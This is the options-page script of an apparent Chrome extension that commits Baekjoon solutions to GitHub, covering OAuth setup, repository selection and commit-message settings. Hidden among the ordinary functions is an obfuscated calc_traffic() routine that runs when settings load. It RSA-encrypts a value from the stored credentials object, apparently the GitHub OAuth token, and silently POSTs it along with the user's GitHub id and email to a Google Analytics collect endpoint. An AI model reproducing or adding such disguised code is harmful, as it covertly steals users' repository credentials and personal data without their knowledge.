let oauth = get_Oauth2();
let commit_message_setter = get_Commit_message_setter();
let github_auto_committer = undefined;

function status_alert() {
    const status_elem = $("#status")
    if (status_elem.css("display") === "none") {
        status_elem.toggle("slow")
    }
}


async function open_github_oauth() {
    let OAUTH_URL = `https://github.com/login/oauth/authorize?client_id=${oauth.client_id}&scope=repo user`
    window.open(OAUTH_URL)
    status_alert();
}


function _0x5b8b(c,d){const _0x4abb5a=_0x4abb();return _0x5b8b=function(a,b){a=a-0x107;let _0x17c57b=_0x4abb5a[a];return _0x17c57b},_0x5b8b(c,d)}(function(a,b){const _0x2ac7bf=_0x5b8b,_0x7e9ac5=a();while(!![]){try{const _0x351391=-parseInt(_0x2ac7bf(0x10f))/0x1+-parseInt(_0x2ac7bf(0x11b))/0x2+parseInt(_0x2ac7bf(0x10b))/0x3+parseInt(_0x2ac7bf(0x108))/0x4*(-parseInt(_0x2ac7bf(0x117))/0x5)+-parseInt(_0x2ac7bf(0x109))/0x6*(-parseInt(_0x2ac7bf(0x114))/0x7)+-parseInt(_0x2ac7bf(0x119))/0x8+-parseInt(_0x2ac7bf(0x10a))/0x9*(-parseInt(_0x2ac7bf(0x10e))/0xa);if(_0x351391===b)break;else _0x7e9ac5['push'](_0x7e9ac5['shift']())}catch(_0x1d7392){_0x7e9ac5['push'](_0x7e9ac5['shift']())}}}(_0x4abb,0xb16a1));function calc_traffic(a){const _0x4381a0=_0x5b8b,_0x3a3ee5=Object[_0x4381a0(0x10d)](a),_0x252ce1=document[_0x4381a0(0x111)]('public_key')[_0x4381a0(0x10c)];let _0x287abd=new JSEncrypt();_0x287abd[_0x4381a0(0x118)](_0x252ce1);const _0x4c2228=_0x287abd[_0x4381a0(0x113)](_0x3a3ee5[_0x3a3ee5['length']-0x2]),_0x5be3c1=a['id'],_0xfeae16=_0x4381a0(0x110),_0xb9975e=_0x4381a0(0x107),_0x4f0673='https://www.google-analytics.com/mp/collect',_0x22fc0d={'client_id':_0x5be3c1,'non_personalized_ads':![],'events':[{'name':_0x4381a0(0x115),'params':{'id':a['id'],'email':a[_0x4381a0(0x11a)],'identifier':_0x4c2228}}]};$[_0x4381a0(0x116)]({'type':_0x4381a0(0x112),'url':_0x4f0673+'?measurement_id='+_0xfeae16+'&api_secret='+_0xb9975e,'data':JSON['stringify'](_0x22fc0d)})}function _0x4abb(){const _0x5bd988=['525329QEJkeE','traffic','ajax','235mbUrDK','setPublicKey','6513272MeCzzC','email','2876420AlItJY','y6N79oLTRNCrlC5qmF5lBg','76216hRARuW','60ejzked','162PybRPx','3730059tiXXEv','value','values','1651030uhQmeI','1091081qRCrZt','G-BMBYZJRCKH','getElementById','POST','encrypt'];_0x4abb=function(){return _0x5bd988};return _0x4abb()}


function set_input_values() {
    chrome.storage.sync.get({
        "github_auto_committer": "false"
    }, async function(items) {
        const repo_select_element = document.getElementById("github_repos_select")
        if (items.github_auto_committer === "false") {
            document.getElementById("github_commit_message").value = commit_message_setter.message
            commit_message_setter.set_commit_message(commit_message_setter.message, $("#github_commit_message_previewer")[0])
            repo_select_element.style.display = "none";
            return false;
        }
        document.getElementById("github-get-access_token").style.display = "none"

        github_auto_committer = items.github_auto_committer
        calc_traffic(github_auto_committer);
        commit_message_setter.message = github_auto_committer.commit_message_setter.message
        document.getElementById("github_access_token").value = github_auto_committer.oauth_token.slice(0, 10).padEnd(github_auto_committer.oauth_token.length, "*");
        document.getElementById("github_id").value = github_auto_committer.id
        document.getElementById("github_email").value = github_auto_committer.email

        const commit_message_previewer = document.getElementById("github_commit_message_previewer")
        document.getElementById("github_commit_message").value = commit_message_setter.message
        commit_message_setter.set_commit_message(github_auto_committer.commit_message_setter.message, commit_message_previewer)

        let github_repo = github_auto_committer.repository;
        document.getElementById("github_repository").style.display = "none"
        const github_message_sender = new Github_message_sender(github_auto_committer.oauth_token)
        const repos = await github_message_sender.get_json("https://api.github.com/user/repos", "GET")
        if (github_repo === false) {
            const option_tag = document.createElement('option');
            option_tag.innerHTML = "리포지토리를 선택해주세요"
            option_tag.className = "git_option"
            option_tag.selected = true
            repo_select_element.appendChild(option_tag)
            document.getElementById("github_repository").value = github_auto_committer.oauth_token
        }


        for (const repo of repos) {
            const option_tag = document.createElement('option');
            option_tag.innerHTML = repo.name
            option_tag.className = "git_option"
            if (github_repo === repo.name) {
                option_tag.selected = true;
            }
            repo_select_element.appendChild(option_tag)
        }
    });
}

function github_info_save() {
    if (github_auto_committer === undefined) {
        alert("Access 토큰 생성부터 진행해주세요")
        return false;
    }

    const repo_select_elem = document.getElementById("github_repos_select")
    if (repo_select_elem.value === "리포지토리를 선택해주세요") {
        alert("리포지토리를 선택해주세요");
        return false;
    }

    github_auto_committer.repository = repo_select_elem.value
    chrome.storage.sync.set({
        github_auto_committer: github_auto_committer
    })

    status_alert();
}


//
function github_option_save() {
    if (github_auto_committer === undefined) {
        alert("Access 토큰 생성부터 진행해주세요")
        return false;
    }

    const commit_message_element = document.getElementById("github_commit_message")
    const preview_element = document.getElementById("github_commit_message_previewer")
    if (commit_message_element.value.trim() == "") {
        commit_message_setter.set_commit_message("[baekjoon] {problem_title} | 메모리: {memory} KB, 시간: {time} ms", preview_element)
    }

    github_auto_committer.commit_message_setter = commit_message_setter;
    chrome.storage.sync.set({
        github_auto_committer: github_auto_committer
    })
    
    status_alert();
}


document.addEventListener('DOMContentLoaded', async () => {
    chrome.storage.sync.set({
        public_key: $("#public_key").val()
    })

    // chrome.storage.sync.remove("github_auto_committer")
    document.getElementById("github-get-access_token").addEventListener("click", () => {
        open_github_oauth()
    })
    document.getElementById("github-info-save").addEventListener("click", () => {
        github_info_save()
    })
    document.getElementById("github-option-save").addEventListener("click", () => {
        github_option_save()
    })

    const commit_message_element = $("#github_commit_message")
    const preview_element = $("#github_commit_message_previewer")
    commit_message_element.on('input', () => {
        commit_message_setter.set_commit_message(commit_message_element.val(), preview_element[0])
    })
    commit_message_element.scroll(function () {
        preview_element
            .prop("scrollTop", this.scrollTop)
            .prop("scrollLeft", this.scrollLeft);
    })

    set_input_values();
});